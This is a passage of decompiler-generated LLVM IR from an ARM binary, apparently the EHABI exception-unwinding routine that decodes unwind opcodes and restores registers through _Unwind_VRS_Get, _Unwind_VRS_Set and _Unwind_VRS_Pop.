  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1854c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1854c

dec_label_pc_1842c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18438 = load i32, i32* @r7, align 4
  store i32 %v0_18438, i32* %r0.global-to-local, align 4
  %v5_18440 = call i32 @_Unwind_VRS_Get(i32 %v0_18438, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18448 = load i32, i32* @r7, align 4
  store i32 %v0_18448, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18458 = call i32 @_Unwind_VRS_Set(i32 %v0_18448, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18458, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1827c.backedge

dec_label_pc_18460:                               ; preds = %dec_label_pc_18398
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18470 = load i32, i32* @r7, align 4
  store i32 %v0_18470, i32* %r0.global-to-local, align 4
  %v7_18478 = call i32 @_Unwind_VRS_Get(i32 %v0_18470, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1847c = load i32, i32* @r7, align 4
  store i32 %v0_1847c, i32* %r0.global-to-local, align 4
  %v0_18480 = load i32, i32* @sl, align 4
  store i32 %v0_18480, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_18480, i32* %r3.global-to-local, align 4
  %v5_18490 = call i32 @_Unwind_VRS_Set(i32 %v0_1847c, i32 %v0_18480, i32 15, i32 %v0_18480, i8* bitcast (i32* @0 to i8*))
  %v0_18494 = load i32, i32* @sl, align 4
  store i32 %v0_18494, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_1849c:                               ; preds = %dec_label_pc_18690
  %v7_1849c = icmp eq i32 %v0_18690, 199
  store i1 %v7_1849c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1849c, label %dec_label_pc_18770, label %dec_label_pc_184a4

dec_label_pc_184a4:                               ; preds = %dec_label_pc_1849c
  %v1_184a4 = and i32 %v0_182d4, 248
  store i32 %v1_184a4, i32* %r3.global-to-local, align 4
  %v7_184a8 = icmp eq i32 %v1_184a4, 192
  store i1 %v7_184a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_184a8, label %.thread24, label %dec_label_pc_184c0

.thread24:                                        ; preds = %dec_label_pc_184a4
  %v2_184ac = urem i32 %v0_182d4, 16
  %v2_184b0 = add nuw nsw i32 %v2_184ac, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_184b8 = or i32 %v2_184b0, 655360
  store i32 %v2_184b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_184c0:                               ; preds = %dec_label_pc_184a4
  %v7_184c0 = icmp eq i32 %v0_18690, 200
  store i1 %v7_184c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_184c0, label %dec_label_pc_18704, label %dec_label_pc_184c8

dec_label_pc_184c8:                               ; preds = %dec_label_pc_184c0
  %v7_184c8 = icmp eq i32 %v0_18690, 201
  store i1 %v7_184c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_184c8, label %dec_label_pc_184d0, label %dec_label_pc_1854c

dec_label_pc_184d0:                               ; preds = %dec_label_pc_184c8
  %v0_184d0 = load i32, i32* @r5, align 4
  %v1_184d0 = add i32 %v0_184d0, 8
  %v2_184d0 = inttoptr i32 %v1_184d0 to i8*
  %v3_184d0 = load i8, i8* %v2_184d0, align 1
  %v4_184d0 = zext i8 %v3_184d0 to i32
  store i32 %v4_184d0, i32* %r3.global-to-local, align 4
  %v2_184d4 = icmp eq i8 %v3_184d0, 0
  store i1 %v2_184d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_184d4, label %dec_label_pc_184e4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_184d0
  %v2_184d8 = add nsw i32 %v4_184d0, -1
  store i32 %v2_184d8, i32* %r3.global-to-local, align 4
  %v2_184dc = trunc i32 %v2_184d8 to i8
  store i8 %v2_184dc, i8* %v2_184d0, align 1
  %v0_184e0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_184e0.pr.pr, label %.thread26.dec_label_pc_184e4_crit_edge, label %dec_label_pc_18518

.thread26.dec_label_pc_184e4_crit_edge:           ; preds = %.thread26
  %v0_184e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_184e4

dec_label_pc_184e4:                               ; preds = %.thread26.dec_label_pc_184e4_crit_edge, %dec_label_pc_184d0
  %v2_184fc = phi i32 [ %v0_184e4.pre, %.thread26.dec_label_pc_184e4_crit_edge ], [ %v0_184d0, %dec_label_pc_184d0 ]
  %v1_184e4 = add i32 %v2_184fc, 9
  %v2_184e4 = inttoptr i32 %v1_184e4 to i8*
  %v3_184e4 = load i8, i8* %v2_184e4, align 1
  %v4_184e4 = zext i8 %v3_184e4 to i32
  store i32 %v4_184e4, i32* %r3.global-to-local, align 4
  %v2_184e8 = icmp eq i8 %v3_184e4, 0
  store i1 %v2_184e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_184e8, label %dec_label_pc_18534, label %dec_label_pc_184f8

dec_label_pc_184f8:                               ; preds = %dec_label_pc_184e4
  %v1_184f8 = add nsw i32 %v4_184e4, -1
  store i32 %v1_184f8, i32* %r3.global-to-local, align 4
  %v1_184fc = trunc i32 %v1_184f8 to i8
  store i8 %v1_184fc, i8* %v2_184e4, align 1
  %v0_18500 = load i32, i32* @r5, align 4
  %v1_18500 = add i32 %v0_18500, 4
  %v2_18500 = inttoptr i32 %v1_18500 to i32*
  %v3_18500 = load i32, i32* %v2_18500, align 4
  store i32 %v3_18500, i32* %r2.global-to-local, align 4
  %v1_18504 = inttoptr i32 %v3_18500 to i32*
  %v2_18504 = load i32, i32* %v1_18504, align 4
  store i32 %v2_18504, i32* %r0.global-to-local, align 4
  %v4_18504 = add i32 %v3_18500, 4
  store i32 %v4_18504, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18504, i32* %v2_18500, align 4
  %v0_18510 = load i32, i32* %r3.global-to-local, align 4
  %v1_18510 = trunc i32 %v0_18510 to i8
  %v2_18510 = load i32, i32* @r5, align 4
  %v3_18510 = add i32 %v2_18510, 8
  %v4_18510 = inttoptr i32 %v3_18510 to i8*
  store i8 %v1_18510, i8* %v4_18510, align 1
  %v0_18514 = load i32, i32* %r0.global-to-local, align 4
  %v1_18514 = load i32, i32* @r5, align 4
  %v2_18514 = inttoptr i32 %v1_18514 to i32*
  store i32 %v0_18514, i32* %v2_18514, align 4
  br label %dec_label_pc_18518

dec_label_pc_18518:                               ; preds = %.thread26, %dec_label_pc_184f8
  %v0_18518 = load i32, i32* %r0.global-to-local, align 4
  %v3_18518 = udiv i32 %v0_18518, 16777216
  %v1_1851c = urem i32 %v3_18518, 16
  %v3_18520 = mul i32 %v0_18518, 256
  %v1_18524 = add nuw nsw i32 %v1_1851c, 1
  store i32 %v1_18524, i32* %r1.global-to-local, align 4
  %v1_18528 = and i32 %v3_18518, 240
  store i32 %v1_18528, i32* %r3.global-to-local, align 4
  %v1_1852c = load i32, i32* @r5, align 4
  %v2_1852c = inttoptr i32 %v1_1852c to i32*
  store i32 %v3_18520, i32* %v2_1852c, align 4
  %v0_18530 = load i32, i32* %r1.global-to-local, align 4
  %v1_18530 = load i32, i32* %r3.global-to-local, align 4
  %v4_18530 = mul i32 %v1_18530, 4096
  %v5_18530 = or i32 %v4_18530, %v0_18530
  br label %dec_label_pc_18534

dec_label_pc_18534:                               ; preds = %dec_label_pc_184e4, %dec_label_pc_18518
  %storemerge = phi i32 [ %v5_18530, %dec_label_pc_18518 ], [ 720897, %dec_label_pc_184e4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18534 = load i32, i32* @r7, align 4
  store i32 %v0_18534, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18540 = call i32 @_Unwind_VRS_Pop(i32 %v0_18534, i32 1, i32 5, i32 5)
  store i32 %v4_18540, i32* %r0.global-to-local, align 4
  %v2_18544 = icmp eq i32 %v4_18540, 0
  store i1 %v2_18544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18544, label %dec_label_pc_1827c.backedge, label %dec_label_pc_1854c

dec_label_pc_1854c:                               ; preds = %dec_label_pc_18798, %dec_label_pc_184c8, %dec_label_pc_185a8, %dec_label_pc_1894c, %dec_label_pc_1891c, %dec_label_pc_188f8, %dec_label_pc_18784, %dec_label_pc_18534, %dec_label_pc_18348, %dec_label_pc_1833c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_18554:                               ; preds = %dec_label_pc_1840c
  %v7_18554 = icmp eq i32 %v1_182dc, 160
  store i1 %v7_18554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18554, label %dec_label_pc_1855c, label %dec_label_pc_18598

dec_label_pc_1855c:                               ; preds = %dec_label_pc_18554
  %v0_1855c = load i32, i32* %ip.global-to-local, align 4
  %v1_1855c = urem i32 %v0_1855c, 8
  %v1_18560 = xor i32 %v1_1855c, 7
  store i32 %v1_18560, i32* %r3.global-to-local, align 4
  %v6_18568 = lshr i32 4080, %v1_18560
  %v1_1856c = and i32 %v0_182d4, 8
  %v2_1856c = icmp eq i32 %v1_1856c, 0
  store i1 %v2_1856c, i1* %cpsr_z.global-to-local, align 1
  %v1_18570 = and i32 %v6_18568, 4080
  %tmp155 = mul nuw nsw i32 %v1_1856c, 2048
  %tmp156 = or i32 %v1_18570, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_1857c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1890c.dec_label_pc_1857c_crit_edge, %bb157, %dec_label_pc_18768, %dec_label_pc_186fc, %dec_label_pc_1865c, %dec_label_pc_1855c
  %v2_18584 = phi i32 [ %v2_18680, %.thread44 ], [ %v2_18688, %bb157 ], [ %v2_18584.pre, %dec_label_pc_1890c.dec_label_pc_1857c_crit_edge ], [ %v2_184b8, %.thread24 ], [ %storemerge130, %dec_label_pc_18768 ], [ %storemerge131, %dec_label_pc_186fc ], [ %storemerge132, %dec_label_pc_1865c ], [ %tmp156, %dec_label_pc_1855c ]
  %v0_18580 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1890c.dec_label_pc_1857c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18768 ], [ 3, %dec_label_pc_186fc ], [ 1, %dec_label_pc_1865c ], [ 0, %dec_label_pc_1855c ]
  %v0_1857c = load i32, i32* @r7, align 4
  store i32 %v0_1857c, i32* %r0.global-to-local, align 4
  store i32 %v0_18580, i32* %r3.global-to-local, align 4
  %v4_18584 = call i32 @_Unwind_VRS_Pop(i32 %v0_1857c, i32 %v0_18580, i32 %v2_18584, i32 %v0_18580)
  store i32 %v4_18584, i32* %r0.global-to-local, align 4
  %v2_18588 = icmp eq i32 %v4_18584, 0
  store i1 %v2_18588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18588, label %dec_label_pc_1827c.backedge, label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %dec_label_pc_1857c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_18598:                               ; preds = %dec_label_pc_18554
  %v7_18598 = icmp eq i32 %v1_182dc, 176
  store i1 %v7_18598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18598, label %dec_label_pc_185e0, label %dec_label_pc_185a0

dec_label_pc_185a0:                               ; preds = %dec_label_pc_18598
  %v7_185a0 = icmp eq i32 %v1_182dc, 192
  store i1 %v7_185a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_185a0, label %dec_label_pc_18690, label %dec_label_pc_185a8

dec_label_pc_185a8:                               ; preds = %dec_label_pc_185a0
  %v1_185a8 = and i32 %v0_182d4, 248
  store i32 %v1_185a8, i32* %r3.global-to-local, align 4
  %v7_185ac = icmp eq i32 %v1_185a8, 208
  store i1 %v7_185ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_185ac, label %dec_label_pc_185b4, label %dec_label_pc_1854c

dec_label_pc_185b4:                               ; preds = %dec_label_pc_185a8
  %v1_185b4 = urem i32 %v0_182d4, 8
  %v1_185b8 = add nuw nsw i32 %v1_185b4, 1
  %v1_185bc = or i32 %v1_185b8, 524288
  store i32 %v1_185bc, i32* %r2.global-to-local, align 4
  %v0_185c0 = load i32, i32* @r7, align 4
  store i32 %v0_185c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_185cc = call i32 @_Unwind_VRS_Pop(i32 %v0_185c0, i32 1, i32 %v1_185bc, i32 5)
  store i32 %v4_185cc, i32* %r0.global-to-local, align 4
  %v2_185d0 = icmp eq i32 %v4_185cc, 0
  store i1 %v2_185d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185d0, label %dec_label_pc_1827c.backedge, label %dec_label_pc_185d8

dec_label_pc_185d8:                               ; preds = %dec_label_pc_185b4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_185e0:                               ; preds = %dec_label_pc_18598
  %v0_185e0 = load i32, i32* %ip.global-to-local, align 4
  %v7_185e0 = icmp eq i32 %v0_185e0, 177
  store i1 %v7_185e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_185e0, label %dec_label_pc_188e4, label %dec_label_pc_185e8

dec_label_pc_185e8:                               ; preds = %dec_label_pc_185e0
  %v7_185e8 = icmp eq i32 %v0_185e0, 178
  store i1 %v7_185e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_185e8, label %dec_label_pc_187bc, label %dec_label_pc_185f0

dec_label_pc_185f0:                               ; preds = %dec_label_pc_185e8
  %v7_185f0 = icmp eq i32 %v0_185e0, 179
  store i1 %v7_185f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_185f0, label %dec_label_pc_185f8, label %dec_label_pc_18664

dec_label_pc_185f8:                               ; preds = %dec_label_pc_185f0
  %v0_185f8 = load i32, i32* @r5, align 4
  %v1_185f8 = add i32 %v0_185f8, 8
  %v2_185f8 = inttoptr i32 %v1_185f8 to i8*
  %v3_185f8 = load i8, i8* %v2_185f8, align 1
  %v4_185f8 = zext i8 %v3_185f8 to i32
  store i32 %v4_185f8, i32* %r3.global-to-local, align 4
  %v2_185fc = icmp eq i8 %v3_185f8, 0
  store i1 %v2_185fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185fc, label %dec_label_pc_1860c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_185f8
  %v2_18600 = add nsw i32 %v4_185f8, -1
  store i32 %v2_18600, i32* %r3.global-to-local, align 4
  %v2_18604 = trunc i32 %v2_18600 to i8
  store i8 %v2_18604, i8* %v2_185f8, align 1
  %v0_18608.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18608.pr.pr, label %.thread30.dec_label_pc_1860c_crit_edge, label %dec_label_pc_18640

.thread30.dec_label_pc_1860c_crit_edge:           ; preds = %.thread30
  %v0_1860c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1860c

dec_label_pc_1860c:                               ; preds = %.thread30.dec_label_pc_1860c_crit_edge, %dec_label_pc_185f8
  %v2_18624 = phi i32 [ %v0_1860c.pre, %.thread30.dec_label_pc_1860c_crit_edge ], [ %v0_185f8, %dec_label_pc_185f8 ]
  %v1_1860c = add i32 %v2_18624, 9
  %v2_1860c = inttoptr i32 %v1_1860c to i8*
  %v3_1860c = load i8, i8* %v2_1860c, align 1
  %v4_1860c = zext i8 %v3_1860c to i32
  store i32 %v4_1860c, i32* %r3.global-to-local, align 4
  %v2_18610 = icmp eq i8 %v3_1860c, 0
  store i1 %v2_18610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18610, label %dec_label_pc_1865c, label %dec_label_pc_18620

dec_label_pc_18620:                               ; preds = %dec_label_pc_1860c
  %v1_18620 = add nsw i32 %v4_1860c, -1
  store i32 %v1_18620, i32* %r3.global-to-local, align 4
  %v1_18624 = trunc i32 %v1_18620 to i8
  store i8 %v1_18624, i8* %v2_1860c, align 1
  %v0_18628 = load i32, i32* @r5, align 4
  %v1_18628 = add i32 %v0_18628, 4
  %v2_18628 = inttoptr i32 %v1_18628 to i32*
  %v3_18628 = load i32, i32* %v2_18628, align 4
  store i32 %v3_18628, i32* %r2.global-to-local, align 4
  %v1_1862c = inttoptr i32 %v3_18628 to i32*
  %v2_1862c = load i32, i32* %v1_1862c, align 4
  store i32 %v2_1862c, i32* %r0.global-to-local, align 4
  %v4_1862c = add i32 %v3_18628, 4
  store i32 %v4_1862c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1862c, i32* %v2_18628, align 4
  %v0_18638 = load i32, i32* %r3.global-to-local, align 4
  %v1_18638 = trunc i32 %v0_18638 to i8
  %v2_18638 = load i32, i32* @r5, align 4
  %v3_18638 = add i32 %v2_18638, 8
  %v4_18638 = inttoptr i32 %v3_18638 to i8*
  store i8 %v1_18638, i8* %v4_18638, align 1
  %v0_1863c = load i32, i32* %r0.global-to-local, align 4
  %v1_1863c = load i32, i32* @r5, align 4
  %v2_1863c = inttoptr i32 %v1_1863c to i32*
  store i32 %v0_1863c, i32* %v2_1863c, align 4
  br label %dec_label_pc_18640

dec_label_pc_18640:                               ; preds = %.thread30, %dec_label_pc_18620
  %v0_18640 = load i32, i32* %r0.global-to-local, align 4
  %v3_18640 = udiv i32 %v0_18640, 16777216
  %v1_18644 = urem i32 %v3_18640, 16
  %v3_18648 = mul i32 %v0_18640, 256
  store i32 %v3_18648, i32* %r0.global-to-local, align 4
  %v1_1864c = add nuw nsw i32 %v1_18644, 1
  store i32 %v1_1864c, i32* %r2.global-to-local, align 4
  %v1_18650 = and i32 %v3_18640, 240
  store i32 %v1_18650, i32* %r3.global-to-local, align 4
  %v1_18654 = load i32, i32* @r5, align 4
  %v2_18654 = inttoptr i32 %v1_18654 to i32*
  store i32 %v3_18648, i32* %v2_18654, align 4
  %v0_18658 = load i32, i32* %r2.global-to-local, align 4
  %v1_18658 = load i32, i32* %r3.global-to-local, align 4
  %v4_18658 = mul i32 %v1_18658, 4096
  %v5_18658 = or i32 %v4_18658, %v0_18658
  br label %dec_label_pc_1865c

dec_label_pc_1865c:                               ; preds = %dec_label_pc_1860c, %dec_label_pc_18640
  %storemerge132 = phi i32 [ %v5_18658, %dec_label_pc_18640 ], [ 720897, %dec_label_pc_1860c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18664:                               ; preds = %dec_label_pc_185f0
  %v1_18664 = and i32 %v0_182d4, 252
  store i32 %v1_18664, i32* %r3.global-to-local, align 4
  %v7_18668 = icmp eq i32 %v1_18664, 180
  store i1 %v7_18668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18668, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_18664
  %v2_1866c = urem i32 %v0_182d4, 4
  %v2_18674 = add nuw nsw i32 %v2_1866c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_18680 = or i32 %v2_18674, 262144
  store i32 %v2_18680, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1857c

bb157:                                            ; preds = %dec_label_pc_18664
  %v2_18670 = urem i32 %v0_185e0, 8
  %v2_18678 = add nuw nsw i32 %v2_18670, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18688 = or i32 %v2_18678, 524288
  store i32 %v2_18688, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18690:                               ; preds = %dec_label_pc_185a0
  %v0_18690 = load i32, i32* %ip.global-to-local, align 4
  %v7_18690 = icmp eq i32 %v0_18690, 198
  store i1 %v7_18690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18690, label %dec_label_pc_18698, label %dec_label_pc_1849c

dec_label_pc_18698:                               ; preds = %dec_label_pc_18690
  %v0_18698 = load i32, i32* @r5, align 4
  %v1_18698 = add i32 %v0_18698, 8
  %v2_18698 = inttoptr i32 %v1_18698 to i8*
  %v3_18698 = load i8, i8* %v2_18698, align 1
  %v4_18698 = zext i8 %v3_18698 to i32
  store i32 %v4_18698, i32* %r3.global-to-local, align 4
  %v2_1869c = icmp eq i8 %v3_18698, 0
  store i1 %v2_1869c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1869c, label %dec_label_pc_186ac, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_18698
  %v2_186a0 = add nsw i32 %v4_18698, -1
  store i32 %v2_186a0, i32* %r3.global-to-local, align 4
  %v2_186a4 = trunc i32 %v2_186a0 to i8
  store i8 %v2_186a4, i8* %v2_18698, align 1
  %v0_186a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_186a8.pr.pr, label %.thread48.dec_label_pc_186ac_crit_edge, label %dec_label_pc_186e0

.thread48.dec_label_pc_186ac_crit_edge:           ; preds = %.thread48
  %v0_186ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %.thread48.dec_label_pc_186ac_crit_edge, %dec_label_pc_18698
  %v2_186c4 = phi i32 [ %v0_186ac.pre, %.thread48.dec_label_pc_186ac_crit_edge ], [ %v0_18698, %dec_label_pc_18698 ]
  %v1_186ac = add i32 %v2_186c4, 9
  %v2_186ac = inttoptr i32 %v1_186ac to i8*
  %v3_186ac = load i8, i8* %v2_186ac, align 1
  %v4_186ac = zext i8 %v3_186ac to i32
  store i32 %v4_186ac, i32* %r3.global-to-local, align 4
  %v2_186b0 = icmp eq i8 %v3_186ac, 0
  store i1 %v2_186b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186b0, label %dec_label_pc_186fc, label %dec_label_pc_186c0

dec_label_pc_186c0:                               ; preds = %dec_label_pc_186ac
  %v1_186c0 = add nsw i32 %v4_186ac, -1
  store i32 %v1_186c0, i32* %r3.global-to-local, align 4
  %v1_186c4 = trunc i32 %v1_186c0 to i8
  store i8 %v1_186c4, i8* %v2_186ac, align 1
  %v0_186c8 = load i32, i32* @r5, align 4
  %v1_186c8 = add i32 %v0_186c8, 4
  %v2_186c8 = inttoptr i32 %v1_186c8 to i32*
  %v3_186c8 = load i32, i32* %v2_186c8, align 4
  store i32 %v3_186c8, i32* %r2.global-to-local, align 4
  %v1_186cc = inttoptr i32 %v3_186c8 to i32*
  %v2_186cc = load i32, i32* %v1_186cc, align 4
  store i32 %v2_186cc, i32* %r0.global-to-local, align 4
  %v4_186cc = add i32 %v3_186c8, 4
  store i32 %v4_186cc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_186cc, i32* %v2_186c8, align 4
  %v0_186d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_186d8 = trunc i32 %v0_186d8 to i8
  %v2_186d8 = load i32, i32* @r5, align 4
  %v3_186d8 = add i32 %v2_186d8, 8
  %v4_186d8 = inttoptr i32 %v3_186d8 to i8*
  store i8 %v1_186d8, i8* %v4_186d8, align 1
  %v0_186dc = load i32, i32* %r0.global-to-local, align 4
  %v1_186dc = load i32, i32* @r5, align 4
  %v2_186dc = inttoptr i32 %v1_186dc to i32*
  store i32 %v0_186dc, i32* %v2_186dc, align 4
  br label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %.thread48, %dec_label_pc_186c0
  %v0_186e0 = load i32, i32* %r0.global-to-local, align 4
  %v3_186e0 = udiv i32 %v0_186e0, 16777216
  %v1_186e4 = urem i32 %v3_186e0, 16
  %v3_186e8 = mul i32 %v0_186e0, 256
  store i32 %v3_186e8, i32* %r0.global-to-local, align 4
  %v1_186ec = add nuw nsw i32 %v1_186e4, 1
  store i32 %v1_186ec, i32* %r2.global-to-local, align 4
  %v1_186f0 = and i32 %v3_186e0, 240
  store i32 %v1_186f0, i32* %r3.global-to-local, align 4
  %v1_186f4 = load i32, i32* @r5, align 4
  %v2_186f4 = inttoptr i32 %v1_186f4 to i32*
  store i32 %v3_186e8, i32* %v2_186f4, align 4
  %v0_186f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_186f8 = load i32, i32* %r3.global-to-local, align 4
  %v4_186f8 = mul i32 %v1_186f8, 4096
  %v5_186f8 = or i32 %v4_186f8, %v0_186f8
  br label %dec_label_pc_186fc

dec_label_pc_186fc:                               ; preds = %dec_label_pc_186ac, %dec_label_pc_186e0
  %storemerge131 = phi i32 [ %v5_186f8, %dec_label_pc_186e0 ], [ 720897, %dec_label_pc_186ac ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18704:                               ; preds = %dec_label_pc_184c0
  %v0_18704 = load i32, i32* @r5, align 4
  %v1_18704 = add i32 %v0_18704, 8
  %v2_18704 = inttoptr i32 %v1_18704 to i8*
  %v3_18704 = load i8, i8* %v2_18704, align 1
  %v4_18704 = zext i8 %v3_18704 to i32
  store i32 %v4_18704, i32* %r3.global-to-local, align 4
  %v2_18708 = icmp eq i8 %v3_18704, 0
  store i1 %v2_18708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18708, label %dec_label_pc_18718, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18704
  %v2_1870c = add nsw i32 %v4_18704, -1
  store i32 %v2_1870c, i32* %r3.global-to-local, align 4
  %v2_18710 = trunc i32 %v2_1870c to i8
  store i8 %v2_18710, i8* %v2_18704, align 1
  %v0_18714.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18714.pr.pr, label %.thread52.dec_label_pc_18718_crit_edge, label %dec_label_pc_1874c

.thread52.dec_label_pc_18718_crit_edge:           ; preds = %.thread52
  %v0_18718.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18718

dec_label_pc_18718:                               ; preds = %.thread52.dec_label_pc_18718_crit_edge, %dec_label_pc_18704
  %v2_18730 = phi i32 [ %v0_18718.pre, %.thread52.dec_label_pc_18718_crit_edge ], [ %v0_18704, %dec_label_pc_18704 ]
  %v1_18718 = add i32 %v2_18730, 9
  %v2_18718 = inttoptr i32 %v1_18718 to i8*
  %v3_18718 = load i8, i8* %v2_18718, align 1
  %v4_18718 = zext i8 %v3_18718 to i32
  store i32 %v4_18718, i32* %r3.global-to-local, align 4
  %v2_1871c = icmp eq i8 %v3_18718, 0
  store i1 %v2_1871c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1871c, label %dec_label_pc_18768, label %dec_label_pc_1872c

dec_label_pc_1872c:                               ; preds = %dec_label_pc_18718
  %v1_1872c = add nsw i32 %v4_18718, -1
  store i32 %v1_1872c, i32* %r3.global-to-local, align 4
  %v1_18730 = trunc i32 %v1_1872c to i8
  store i8 %v1_18730, i8* %v2_18718, align 1
  %v0_18734 = load i32, i32* @r5, align 4
  %v1_18734 = add i32 %v0_18734, 4
  %v2_18734 = inttoptr i32 %v1_18734 to i32*
  %v3_18734 = load i32, i32* %v2_18734, align 4
  store i32 %v3_18734, i32* %r2.global-to-local, align 4
  %v1_18738 = inttoptr i32 %v3_18734 to i32*
  %v2_18738 = load i32, i32* %v1_18738, align 4
  store i32 %v2_18738, i32* %r0.global-to-local, align 4
  %v4_18738 = add i32 %v3_18734, 4
  store i32 %v4_18738, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18738, i32* %v2_18734, align 4
  %v0_18744 = load i32, i32* %r3.global-to-local, align 4
  %v1_18744 = trunc i32 %v0_18744 to i8
  %v2_18744 = load i32, i32* @r5, align 4
  %v3_18744 = add i32 %v2_18744, 8
  %v4_18744 = inttoptr i32 %v3_18744 to i8*
  store i8 %v1_18744, i8* %v4_18744, align 1
  %v0_18748 = load i32, i32* %r0.global-to-local, align 4
  %v1_18748 = load i32, i32* @r5, align 4
  %v2_18748 = inttoptr i32 %v1_18748 to i32*
  store i32 %v0_18748, i32* %v2_18748, align 4
  br label %dec_label_pc_1874c

dec_label_pc_1874c:                               ; preds = %.thread52, %dec_label_pc_1872c
  %v0_1874c = load i32, i32* %r0.global-to-local, align 4
  %v3_1874c = udiv i32 %v0_1874c, 16777216
  %v1_18750 = urem i32 %v3_1874c, 16
  %v3_18754 = mul i32 %v0_1874c, 256
  store i32 %v3_18754, i32* %r0.global-to-local, align 4
  %v1_18758 = add nuw nsw i32 %v1_18750, 1
  store i32 %v1_18758, i32* %r2.global-to-local, align 4
  %v1_1875c = and i32 %v3_1874c, 240
  store i32 %v1_1875c, i32* %r3.global-to-local, align 4
  %v1_18760 = load i32, i32* @r5, align 4
  %v2_18760 = inttoptr i32 %v1_18760 to i32*
  store i32 %v3_18754, i32* %v2_18760, align 4
